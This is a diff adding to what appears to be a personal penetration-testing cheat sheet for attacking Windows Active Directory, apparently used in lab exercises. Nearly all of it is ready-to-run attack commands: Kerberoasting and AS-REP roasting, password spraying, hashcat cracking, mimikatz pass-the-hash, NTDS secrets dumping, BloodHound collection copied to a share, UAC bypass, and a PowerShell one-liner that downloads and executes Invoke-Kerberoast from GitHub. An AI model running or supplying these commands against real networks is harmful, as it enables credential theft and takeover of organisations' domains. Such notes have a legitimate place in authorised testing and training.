@@ -44,11 +44,165 @@ dnsenum mike.com --dnsserver dns.mike.com -f ~/tools/wordlists/dns.txt
 
 Zone Transfer
 dnsrecon -d mike.com -t axfr  
-nmap --script=dns-zone-transfer -p 53 ns2.mysite.com 
+nmap --script=dns-zone-transfer -p 53 ns2.mike.com 
 
 LDAP
 nmap -n -sV --script "ldap* and not brute" 192.168.200.5
 ldapsearch -x -h 192.168.200.5 -s base namingcontexts  
 ldapsearch -x -h 192.168.200.5 -b 'DC=mike,DC=com' -s sub | grep -i sam  
-ldapsearch -x -h 192.168.200.5 -D '' -w '' -b "DC=acme,DC=com" |  grep sAMAccountName: 
-ldapsearch -x -h 192.168.200.5 -D "cn=admin,dc=acme,dc=com" -s sub "cn=*"
+ldapsearch -x -h 192.168.200.5 -D '' -w '' -b "DC=mike,DC=com" |  grep sAMAccountName: 
+ldapsearch -x -h 192.168.200.5 -D "cn=admin,dc=mike,dc=com" -s sub "cn=*"
+
+
+ 
+===================================
+Easy Roast (needs creds/hash/ticket) 
+
+echo "192.168.200.5 mike.com" >> /etc/hosts  
+GetUserSPNs.py -request domain/SVC_TGS  
+GetUserSPNs.py -request domain/bob:pass -dc-ip 192.168.200.5 -outputfile kbroast.txt 
+
+
+===================================
+GMSA User Crack 
+
+gMSADumper.py -u 'mike' -p paxxword -d mydom.htb    
+  
+===================================
+Silver Ticket 
+
+getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   
+ 
+===================================
+Get Usernames 
+
+lookupsid.py -no-pass mike.com 
+lookupsid.py domain/guest@192.168.200.5
+lookupsid.py domain/Administrator:"Paxxword1\!"@192.168.200.5
+  
+
+===================================
+Test a Userlist 
+
+kerbrute userenum --dc 192.168.200.5 -d mike.com users.txt 
+
+ 
+===================================
+Brute for ASREP Roastable Users 
+
+GetNPUsers.py domain/bob
+GetNPUsers.py domain/ -no-pass -usersfile userlist.txt  
+GetNPUsers.py domain/ -usersfile mylist.txt -format john -outputfile asrep.txt -dc-ip 192.168.200.5 -debug 
+GetNPUsers.py domain/bob:pass -request -format john -outputfile asrep.txt
+john --wordlist=$rockyou --format=krb5asrep asrep.txt
+  
+===================================
+Grab Kerberos Hashes 
+
+Import-Module ./Invoke-Kerberoast.ps1  
+Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII khash0.txt  
+
+Faster: 
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"  
+ 
+===================================
+Crack
+
+hashcat --example-hashes | less  
+hashcat --example-hashes | grep kerb -B2 -A2  
+hashcat -m 18200 hash.txt $rockyou  
+hashcat -m 13100 -a 0 khash0.txt $rockyou --force    
+
+=================================== 
+Bloodhound 
+
+cd C:\Windows\Temp  
+copy \\192.168.162.46\share\SharpHound.exe  
+copy \\192.168.162.46\share\SharpHound.ps1 
+PS> Import-Module .\SharpHound.ps1 
+PS> Invoke-BloodHound -CollectionMethod All 
+SharpHound.exe --CollectionMethod All  
+copy 20220118140920_BloodHound.zip \\192.168.162.46\share\  
+
+===================================  
+Mimikatz/PTH/GetDC 
+
+sekurlsa::pth /user:bob /domain:corp.com /ntlm:abc123xyz /run:PowerShell.exe   
+PS> net user \\mydc 
+PS> klist  
+PS> PsExec.exe \\mydc cmd.exe  
+  
+===================================
+All DC Creds (needs DA user) 
+
+impacket-secretsdump mydomain/dauser@192.168.200.5
+impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract 
+  
+ 
+===================================
+Domain Enums with PowerView 
+
+powershell.exe -nop -exec bypass  
+Import-Module .\PowerView.ps1  
+
+Roast 
+Invoke-Sharefinder 
+Invoke-Kerberoast  
+Invoke-BypassUAC  
+  
+Users 
+Get-NetUser | select cn  
+Get-NetUser | select cn, objectsid, adspath  
+Get-NetUser -UserName Admin2  
+  
+Computers   
+Get-NetComputer 
+Get-NetComputer -Ping 
+Get-NetComputer -fulldata 
+Get-NetComputer -fulldata | select cn, operatingsystem 
+Get-NetLoggedon -ComputerName client251  
+Get-NetSession -ComputerName dc01  
+Find-LocalAdminAccess 
+Invoke-EnumerationLocalAdmin 
+Get-NetLoggedon -ComputerName Domain-Controller.dc.local 
+Get-NetRDPSEssion -ComputerName Domain-Controller.dc.local 
+  
+Groups   
+Get-NetGroup  
+Get-NetGroup -Domain dc.local 
+Get-NetGroup -AdminCount 
+Get-NetGroup -UserName JohnAdmin 
+Get-NetGroupMember -GroupName "Administrators" 
+  
+Domain 
+Get-NetDomain 
+Get-DomainSID 
+Get-DomainPolicy 
+Get-NetDomainController 
+Get-NetGPO 
+
+===================================
+AD  
+
+Check if AD username valid   
+kerbrute userenum --dc 192.168.200.5 -d 192.168.200.5 users.txt   
+kerbrute userenum --dc 192.168.200.5 -d mydomain users.txt   
+kerbrute passwordspray --dc 192.168.200.5 -d mydomain users.txt 'Paxxword'
+crackmapexec smb 192.168.200.5 -u bob -p Paxxword --shares    
+
+Usernames  
+List of Users > Convert to usernames  
+https://github.com/PinkDraconian  
+Then Kerbrute, if you get a list of users.  
+  
+  
+==================================  
+AD/Domain  
+  
+Powerview  
+powershell.exe -nop -exec bypass  
+Import-Module .\PowerView.ps1  
+Get-NetLoggedon -ComputerName client251   
+Get-NetSession -ComputerName dc01   
+Invoke-Kerberoast  
+Invoke-BypassUAC  
